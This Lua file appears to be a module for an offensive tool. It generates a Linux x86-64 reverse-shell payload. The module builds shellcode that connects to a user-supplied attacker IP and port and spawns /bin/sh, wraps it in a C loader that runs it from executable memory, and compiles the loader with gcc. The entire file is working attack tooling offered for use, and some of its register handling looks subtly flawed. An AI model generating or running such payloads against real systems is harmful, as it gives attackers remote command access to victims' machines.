function generate_c_reverse_shell()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    if not lhost or not lport then
        return "Error: lhost or lport not defined."
    end

    -- Convertir la IP a formato hexadecimal little-endian
    local ip_octets = {}
    for octet in lhost:gmatch("%d+") do
        table.insert(ip_octets, tonumber(octet))
    end
    if #ip_octets ~= 4 or not all(ip_octets, function(x) return x >= 0 and x <= 255 end) then
        return "Error: lhost must be a valid IP address (example: 192.168.1.2)."
    end
    local ip_hex_le = string.format("\\x%02X\\x%02X\\x%02X\\x%02X", ip_octets[1], ip_octets[2], ip_octets[3], ip_octets[4])

    -- Convertir el puerto a formato hexadecimal big-endian
    local port_num = tonumber(lport)
    if not port_num or port_num < 1 or port_num > 65535 then
        return "Error: lport must be an int between 1 and 65535."
    end
    local port_hex_be = string.format("\\x%02X\\x%02X", (port_num >> 8) & 0xFF, port_num & 0xFF)

    -- Generar el shellcode en formato raw
    local shellcode = ""
    shellcode = shellcode .. "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2" -- Clear registers
    shellcode = shellcode .. "\\xb0\\x29\\x0f\\x05" -- socket(AF_INET, SOCK_STREAM, 0)
    shellcode = shellcode .. "\\x48\\x89\\xc7" -- Save socket fd in rdi
    shellcode = shellcode .. "\\x52\\x66\\x68" .. port_hex_be -- Push sin_port
    shellcode = shellcode .. "\\x68" .. ip_hex_le -- Push sin_addr
    shellcode = shellcode .. "\\x66\\x68\\x02\\x00\\x89\\xe6" -- Push sin_family and save pointer to sockaddr_in
    shellcode = shellcode .. "\\xb0\\x2a\\x0f\\x05" -- connect(sockfd, &sockaddr_in, sizeof(sockaddr_in))
    shellcode = shellcode .. "\\x48\\x89\\xc7\\xb0\\x21\\x0f\\x05" -- dup2(sockfd, 0)
    shellcode = shellcode .. "\\x48\\x89\\xc7\\xb0\\x21\\xb6\\x01\\x0f\\x05" -- dup2(sockfd, 1)
    shellcode = shellcode .. "\\x48\\x89\\xc7\\xb0\\x21\\xb6\\x02\\x0f\\x05" -- dup2(sockfd, 2)
    shellcode = shellcode .. "\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00" -- execve("/bin/sh", NULL, NULL)
    shellcode = shellcode .. "\\x53\\x48\\x89\\xe7\\x48\\x31\\xf6\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05"

    -- Calcular el tamaño del shellcode
    local shellcode_size = #shellcode / 4 -- Cada byte en el shellcode está representado por 4 caracteres (\xXX)

    -- Plantilla de código C usando mmap con el tamaño correcto
    local c_template = [[
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = "{shellcode}";

int main() {
    // Calculate the size of the shellcode
    size_t shellcode_size = ]] .. shellcode_size .. [[;

    // Allocate executable memory
    void *exec_mem = mmap(0, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, shellcode_size);

    // Execute the shellcode
    void (*ret)() = (void(*)())exec_mem;
    ret();

    return 0;
}
]]

    -- Reemplazar el placeholder {shellcode} con el shellcode generado
    local c_code = c_template:gsub("{shellcode}", shellcode)

    -- Guardar el código C modificado en un archivo
    local file_path = "sessions/reverse_shell.c"
    local file = io.open(file_path, "w")
    if not file then
        return "Error: Could not create file at " .. file_path
    end

    file:write(c_code)
    file:close()

    -- Intentar compilar el código C
    local output = ""
    local success = true

    -- Compilar con gcc
    local gcc_command = "gcc -o sessions/reverse_shell sessions/reverse_shell.c"
    local gcc_result = os.execute(gcc_command)
    if gcc_result ~= 0 then
        success = false
        output = output .. "Error: Failed to compile with gcc.\n"
    end

    -- Retornar el resultado
    if success then
        return "Reverse shell generated successfully. Binary saved at sessions/reverse_shell."
    else
        return "C code generated, but there were errors during compilation:\n" .. output
    end
end

-- Función auxiliar 'all'
function all(tbl, condition)
    for _, v in ipairs(tbl) do
        if not condition(v) then
            return false
        end
    end
    return true
end

-- Registrar el comando
register_command("generate_c_reverse_shell", generate_c_reverse_shell)